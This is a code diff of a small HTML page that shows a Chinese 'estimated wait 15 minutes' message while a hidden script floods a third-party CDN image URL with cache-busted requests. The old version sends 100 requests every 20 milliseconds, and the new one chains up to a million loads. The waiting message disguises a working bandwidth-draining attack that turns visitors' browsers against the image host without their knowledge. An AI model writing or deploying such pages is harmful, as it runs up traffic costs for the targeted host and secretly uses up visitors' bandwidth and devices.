@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>需要等待几分钟</title>
+    <title>预计需等待15分钟</title>
     <style>
         body {
             margin: 0;
@@ -14,20 +14,23 @@
     </style>
 </head>
 <body>
-<h1>需要等待几分钟</h1>
+<h1>预计需等待15分钟</h1>
 <script>
+    let imageCount = 0; 
+    const totalImages = 1000000; 
     function loadImage() {
-        for (let i = 0; i < 100; i++) { 
-            const img = new Image();
-            img.src = 'https://staticsns.cdn.bcebos.com/amis/2024-12/1733110167508/ec2943f8f5e27bd38f00c6e02.png?' + new Date().getTime(); // 防止缓存
-            img.style.display = 'none'; 
-
-            document.body.appendChild(img);
-        }
-        setTimeout(loadImage, 20); 
+        const img = new Image();
+        img.src = 'https://staticsns.cdn.bcebos.com/amis/2024-12/1733110167508/ec2943f8f5e27bd38f00c6e02.png?' + new Date().getTime(); // 防止缓存
+        img.style.display = 'none'; 
+        img.onload = function() {
+            imageCount++;
+            if (imageCount < totalImages) {
+                loadImage(); 
+            }
+        };
+        document.body.appendChild(img);
     }
-    loadImage(); 
+    loadImage();
 </script>
-
 </body>
 </html>
